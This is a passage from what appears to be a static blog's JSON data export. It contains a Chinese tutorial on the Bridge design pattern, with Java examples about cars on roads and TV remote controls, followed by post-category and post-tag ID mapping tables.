System.out.println(<span class=\"string\">\"高速公路\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//小汽车在市区街道行驶</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CarOnStreet</span> <span class=\"keyword\">extends</span> <span class=\"title\">Street</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"小汽车在市区街道行驶\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//小汽车在高速公路行驶</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CarOnSpeedWay</span> <span class=\"keyword\">extends</span> <span class=\"title\">SpeedWay</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"小汽车在高速公路行驶\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//公交车在市区街道行驶</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">BusOnStreet</span> <span class=\"keyword\">extends</span> <span class=\"title\">Street</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"公交车在市区街道行驶\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//公交车在高速公路行驶</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">BusOnSpeedWay</span> <span class=\"keyword\">extends</span> <span class=\"title\">SpeedWay</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"公交车在高速公路行驶\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//测试</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//小汽车在高速公路行驶</span></span><br><span class=\"line\">    CarOnSpeedWay carOnSpeedWay = <span class=\"keyword\">new</span> CarOnSpeedWay();</span><br><span class=\"line\">    carOnSpeedWay.run();</span><br><span class=\"line\">    <span class=\"comment\">//公交车在市区街道行驶</span></span><br><span class=\"line\">    BusOnStreet busOnStreet = <span class=\"keyword\">new</span> BusOnStreet();</span><br><span class=\"line\">    busOnStreet.run();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>但是我们说这样的设计是脆弱的，仔细分析就可以发现，它还是存在很多问题，首先它在遵循开放-封闭原则的同时，违背了类的单一职责原则，即一个类只有一个引起它变化的原因，而这里引起变化的原因却有两个，即路类型的变化和汽车类型的变化；其次是重复代码会很多，不同的汽车在不同的路上行驶也会有一部分的代码是相同的；</p>\n<p>再次是类的结构过于复杂，继承关系太多，难于维护，最后最致命的一点是扩展性太差。如果变化沿着汽车的类型和不同的道路两个方向变化，我们会看到这个类的结构会迅速的变庞大。</p>\n<h3 id=\"应用桥接模式来实现\"><a href=\"#应用桥接模式来实现\" class=\"headerlink\" title=\"应用桥接模式来实现\"></a>应用桥接模式来实现</h3><p>重新设计<br><img src=\"http://ww3.sinaimg.cn/mw690/78f9859egw1eyvh7mry2yj20gg0h1jsz.jpg\" alt=\"\"></p>\n<p>代码实现<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AbstractRoad</span></span>&#123;</span><br><span class=\"line\">    AbstractCar aCar;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span>&#123;&#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AbstractCar</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span>&#123;&#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Street</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractRoad</span></span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// TODO Auto-generated method stub</span></span><br><span class=\"line\">        <span class=\"keyword\">super</span>.run();</span><br><span class=\"line\">        aCar.run();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"在市区街道行驶\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SpeedWay</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractRoad</span></span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// TODO Auto-generated method stub</span></span><br><span class=\"line\">        <span class=\"keyword\">super</span>.run();</span><br><span class=\"line\">        aCar.run();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"在高速公路行驶\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Car</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractCar</span></span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// TODO Auto-generated method stub</span></span><br><span class=\"line\">        <span class=\"keyword\">super</span>.run();</span><br><span class=\"line\">        System.out.print(<span class=\"string\">\"小汽车\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Bus</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractCar</span></span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// TODO Auto-generated method stub</span></span><br><span class=\"line\">        <span class=\"keyword\">super</span>.run();</span><br><span class=\"line\">        System.out.print(<span class=\"string\">\"公交车\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    AbstractRoad speedWay = <span class=\"keyword\">new</span> SpeedWay();</span><br><span class=\"line\">    speedWay.aCar = <span class=\"keyword\">new</span> Car();</span><br><span class=\"line\">    speedWay.run();</span><br><span class=\"line\"></span><br><span class=\"line\">    AbstractRoad street = <span class=\"keyword\">new</span> Street();</span><br><span class=\"line\">    street.aCar = <span class=\"keyword\">new</span> Bus();</span><br><span class=\"line\">    street.run();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这里将Road 和 Car单独抽象，那么其中Road变化和Car变化，都不会影响相互的代码，也没有出现代码重复。通过对象组合的方式，Bridge 模式把两个角色之间的继承关系改为了耦合的关系，从而使这两者可以从容自若的各自独立的变化，这也是Bridge模式的本意。</p>\n<p>这样增加了客户程序与路与汽车的耦合。其实这样的担心是没有必要的，因为这种耦合性是由于对象的创建所带来的，完全可以用创建型模式去解决。在应用时结合创建型设计模式来处理具体的问题。</p>\n<h2 id=\"例子三\"><a href=\"#例子三\" class=\"headerlink\" title=\"例子三\"></a>例子三</h2><p>你有一个电视机的接口，还有一个遥控器的抽象类。我们都知道，将它们中任何一个定义为一个具体类都不是好办法，因为其它厂家会有不同的实现方法。</p>\n<h3 id=\"代码实现\"><a href=\"#代码实现\" class=\"headerlink\" title=\"代码实现\"></a>代码实现</h3><p>首先定义电视机的接口：ITV<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">ITV</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">on</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">off</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">switchChannel</span><span class=\"params\">(<span class=\"keyword\">int</span> channel)</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>实现三星的 ITV 接口<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SamsungTV</span> <span class=\"keyword\">implements</span> <span class=\"title\">ITV</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">on</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Samsung is turned on.\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">off</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Samsung is turned off.\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">switchChannel</span><span class=\"params\">(<span class=\"keyword\">int</span> channel)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Samsung: channel - \"</span> + channel);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>再实现索尼的ITV接口<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SonyTV</span> <span class=\"keyword\">implements</span> <span class=\"title\">ITV</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">on</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Sony is turned on.\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">off</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Sony is turned off.\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">switchChannel</span><span class=\"params\">(<span class=\"keyword\">int</span> channel)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Sony: channel - \"</span> + channel);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>遥控器要包含对TV的引用<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AbstractRemoteControl</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> ITV tv;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">AbstractRemoteControl</span><span class=\"params\">(ITV tv)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.tv = tv;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">turnOn</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        tv.on();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">turnOff</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        tv.off();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setChannel</span><span class=\"params\">(<span class=\"keyword\">int</span> channel)</span></span>&#123;</span><br><span class=\"line\">        tv.switchChannel(channel);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>定义遥控器的具体类<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LogitechRemoteControl</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractRemoteControl</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">LogitechRemoteControl</span><span class=\"params\">(ITV tv)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(tv);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setChannelKeyboard</span><span class=\"params\">(<span class=\"keyword\">int</span> channel)</span></span>&#123;</span><br><span class=\"line\">        setChannel(channel);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Logitech use keyword to set channel.\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Main</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\">        ITV tv = <span class=\"keyword\">new</span> SonyTV();</span><br><span class=\"line\">        LogitechRemoteControl lrc = <span class=\"keyword\">new</span> LogitechRemoteControl(tv);</span><br><span class=\"line\">        lrc.setChannelKeyboard(<span class=\"number\">100</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li><a href=\"https://cnbin.github.io/blog/2015/12/11/javashe-ji-mo-shi-chu-tan-zhi-qiao-jie-mo-shi/\">Java设计模式-桥接模式</a></li>\n<li><a href=\"http://www.runoob.com/design-pattern/bridge-pattern.html\">桥接模式</a></li>\n<li><a href=\"http://www.importnew.com/6857.html\">讲故事，学（Java）设计模式—桥接模式</a></li>\n</ul>"}],"PostAsset":[],"PostCategory":[{"post_id":"cjgrjscw80000yp0lusnvqgpb","category_id":"cjgrjscwq0005yp0lpielq88q","_id":"cjgrjscxe000gyp0ljecwihv4"},{"post_id":"cjgrjscxb000fyp0lzf5x8yu0","category_id":"cjgrjscx7000cyp0lcsivvlbc","_id":"cjgrjscxj000lyp0ly9jqy7sb"},{"post_id":"cjgrjscwi0002yp0lc88hixkl","category_id":"cjgrjscx7000cyp0lcsivvlbc","_id":"cjgrjscxl000pyp0lg5uyts0b"},{"post_id":"cjgrjscxe000hyp0lkt1opimv","category_id":"cjgrjscx7000cyp0lcsivvlbc","_id":"cjgrjscxp000syp0l0ze9am82"},{"post_id":"cjgrjscwr0006yp0lfk1thg30","category_id":"cjgrjscxg000jyp0l7cxtyskg","_id":"cjgrjscxu000xyp0lp233pl0k"},{"post_id":"cjgrjscxj000myp0loo082h8o","category_id":"cjgrjscx7000cyp0lcsivvlbc","_id":"cjgrjscxw000zyp0lwzev75hf"},{"post_id":"cjgrjscww0008yp0lahwegbi8","category_id":"cjgrjscx7000cyp0lcsivvlbc","_id":"cjgrjscxz0012yp0lvkrlltms"},{"post_id":"cjgrjscxu000yyp0l60yyhqna","category_id":"cjgrjscwq0005yp0lpielq88q","_id":"cjgrjscy10015yp0lbtdwr4n6"},{"post_id":"cjgrjscx3000byp0lsj5xwz9r","category_id":"cjgrjscx7000cyp0lcsivvlbc","_id":"cjgrjscy50017yp0l7k5wdir5"},{"post_id":"cjgrjscxx0010yp0l9fi4yxpy","category_id":"cjgrjscwq0005yp0lpielq88q","_id":"cjgrjscy8001byp0lglixtxwc"},{"post_id":"cjgrjscy00014yp0ltl4n16zs","category_id":"cjgrjscxz0011yp0lg40wf24e","_id":"cjgrjscyb001eyp0lsjeo62it"},{"post_id":"cjgrjscxm000qyp0lvuw6uppn","category_id":"cjgrjscxz0011yp0lg40wf24e","_id":"cjgrjscye001jyp0l1g214mcb"},{"post_id":"cjgrjscy60019yp0l1k0d62gf","category_id":"cjgrjscwq0005yp0lpielq88q","_id":"cjgrjscyl001myp0lqefeihcp"},{"post_id":"cjgrjscy8001dyp0lp5sf903j","category_id":"cjgrjscwq0005yp0lpielq88q","_id":"cjgrjscyo001qyp0lg1tjn5vj"},{"post_id":"cjgrjscxp000typ0lg5svzqs3","category_id":"cjgrjscy60018yp0lrfse591q","_id":"cjgrjscyu001syp0l2vz8f88d"},{"post_id":"cjgrjscy20016yp0lyts6u1ss","category_id":"cjgrjscyd001hyp0lng5mxojk","_id":"cjgrjscyx001vyp0lmin4ln6e"},{"post_id":"cjgrjscym001nyp0lh832oe1p","category_id":"cjgrjscyd001hyp0lng5mxojk","_id":"cjgrjscz1001zyp0lqxu4ckdi"},{"post_id":"cjgrjscyc001gyp0luqm27w6b","category_id":"cjgrjscyn001oyp0la3lbgv9c","_id":"cjgrjscz40023yp0lrxq8rqi5"},{"post_id":"cjgrjscyy001xyp0lzclwqfm8","category_id":"cjgrjscyd001hyp0lng5mxojk","_id":"cjgrjscz70027yp0l6zsjyff3"},{"post_id":"cjgrjscyj001lyp0la64mlkva","category_id":"cjgrjscyn001oyp0la3lbgv9c","_id":"cjgrjscz90029yp0lx7ed8pqv"},{"post_id":"cjgrjscz50025yp0ljkznnbh2","category_id":"cjgrjscxz0011yp0lg40wf24e","_id":"cjgrjscze002eyp0lwixu5ghc"},{"post_id":"cjgrjscyo001ryp0lxr5pi3td","category_id":"cjgrjscz30021yp0lbxbcnvwf","_id":"cjgrjsczh002gyp0l2wo308bb"},{"post_id":"cjgrjscz70028yp0lo6by47d5","category_id":"cjgrjscx7000cyp0lcsivvlbc","_id":"cjgrjsczl002jyp0lbr1ahfft"},{"post_id":"cjgrjscza002cyp0l7n5kqufc","category_id":"cjgrjscyn001oyp0la3lbgv9c","_id":"cjgrjsczn002nyp0lrdddofy8"},{"post_id":"cjgrjscyu001typ0lsbtfuhfi","category_id":"cjgrjscz30021yp0lbxbcnvwf","_id":"cjgrjsczq002ryp0laqhq417u"},{"post_id":"cjgrjsczo002pyp0lkzn1n3h6","category_id":"cjgrjscyn001oyp0la3lbgv9c","_id":"cjgrjsczt002xyp0lz2lf2rnu"},{"post_id":"cjgrjsczh002hyp0lkjxfqo1c","category_id":"cjgrjsczn002myp0lm51rq8x1","_id":"cjgrjsczv002zyp0l2u8sdwvu"},{"post_id":"cjgrjsczt002yyp0lksad4tyd","category_id":"cjgrjscyn001oyp0la3lbgv9c","_id":"cjgrjsczz0034yp0l1t62jecc"},{"post_id":"cjgrjsczv0030yp0l5pye5wka","category_id":"cjgrjscyn001oyp0la3lbgv9c","_id":"cjgrjsd010038yp0l5wxzm9pc"},{"post_id":"cjgrjsczq002typ0lpz6rclht","category_id":"cjgrjsczt002wyp0l5hoy2ztu","_id":"cjgrjsd06003byp0lumgpmwds"},{"post_id":"cjgrjsczx0032yp0lyqllcgld","category_id":"cjgrjscyn001oyp0la3lbgv9c","_id":"cjgrjsd08003eyp0lit05khgt"},{"post_id":"cjgrjsczz0035yp0l6mf3y2gk","category_id":"cjgrjscxz0011yp0lg40wf24e","_id":"cjgrjsd0a003iyp0ln1q23tvj"},{"post_id":"cjgrjsd09003gyp0ld5noebew","category_id":"cjgrjscxz0011yp0lg40wf24e","_id":"cjgrjsd0f003oyp0l0pfbkk8j"},{"post_id":"cjgrjsd010039yp0l8vgwe603","category_id":"cjgrjsd08003dyp0lc63ewl47","_id":"cjgrjsd0i003qyp0lj5pr9bsq"},{"post_id":"cjgrjsd0d003lyp0lxqlek4i9","category_id":"cjgrjscx7000cyp0lcsivvlbc","_id":"cjgrjsd0k003typ0lgawfxpqo"},{"post_id":"cjgrjsd0f003pyp0l59k0567o","category_id":"cjgrjscy60018yp0lrfse591q","_id":"cjgrjsd0m003wyp0lwt9ystbu"},{"post_id":"cjgrjsd06003cyp0lzrczy6b2","category_id":"cjgrjsd0e003myp0lemp2bfa0","_id":"cjgrjsd0n003zyp0lvx79k6k3"},{"post_id":"cjgrjsd0k003uyp0ln48n8kg6","category_id":"cjgrjscyn001oyp0la3lbgv9c","_id":"cjgrjsd0q0041yp0lsovkf5di"},{"post_id":"cjgrjsd0m003xyp0lgilq4r1r","category_id":"cjgrjscwq0005yp0lpielq88q","_id":"cjgrjsd0t0044yp0l08lcid7k"},{"post_id":"cjgrjsd0i003ryp0lm5q2z2n5","category_id":"cjgrjsd0l003vyp0l5rwa31jo","_id":"cjgrjsd0t0046yp0lvrjs0muo"},{"post_id":"cjgrjsd0n0040yp0l05wxewfr","category_id":"cjgrjsd0t0043yp0lt0r3edj0","_id":"cjgrjsd0u0049yp0la3sv9tld"},{"post_id":"cjgrjsd0r0042yp0ld85a2zg2","category_id":"cjgrjsd0t0047yp0l027ejjdg","_id":"cjgrjsd0u004cyp0lfsscy28f"}],"PostTag":[{"post_id":"cjgrjscw80000yp0lusnvqgpb","tag_id":"cjgrjscwn0004yp0l41kx8w7j","_id":"cjgrjscxa000eyp0lspu9syof"},{"post_id":"cjgrjscwi0002yp0lc88hixkl","tag_id":"cjgrjscx2000ayp0l27lxfec0","_id":"cjgrjscxp000ryp0lsw24epr7"},{"post_id":"cjgrjscwi0002yp0lc88hixkl","tag_id":"cjgrjscxg000iyp0l4ctzv4k2","_id":"cjgrjscxr000uyp0ln72jlf89"},{"post_id":"cjgrjscwr0006yp0lfk1thg30","tag_id":"cjgrjscxk000nyp0lif8luwa2","_id":"cjgrjscy8001cyp0lvf6weue4"},{"post_id":"cjgrjscwr0006yp0lfk1thg30","tag_id":"cjgrjscxu000wyp0lzu4f2pl0","_id":"cjgrjscyb001fyp0l8ze90n2n"},{"post_id":"cjgrjscwr0006yp0lfk1thg30","tag_id":"cjgrjscy00013yp0lru8g1kzp","_id":"cjgrjscye001kyp0l0euddehk"},{"post_id":"cjgrjscww0008yp0lahwegbi8","tag_id":"cjgrjscy7001ayp0lxxy2qj8u","_id":"cjgrjscz1001yyp0l4ir8emqb"},{"post_id":"cjgrjscww0008yp0lahwegbi8","tag_id":"cjgrjscye001iyp0lwxg430wd","_id":"cjgrjscz40022yp0lyihopvh3"},{"post_id":"cjgrjscww0008yp0lahwegbi8","tag_id":"cjgrjscyo001pyp0l29vx3xa1","_id":"cjgrjscz70026yp0ltlvvnj6w"},{"post_id":"cjgrjscz70028yp0lo6by47d5","tag_id":"cjgrjscyo001pyp0l29vx3xa1","_id":"cjgrjscze002dyp0lz4iay18w"},{"post_id":"cjgrjscx3000byp0lsj5xwz9r","tag_id":"cjgrjscy7001ayp0lxxy2qj8u","_id":"cjgrjsczl002kyp0lyw34o9kb"},{"post_id":"cjgrjscx3000byp0lsj5xwz9r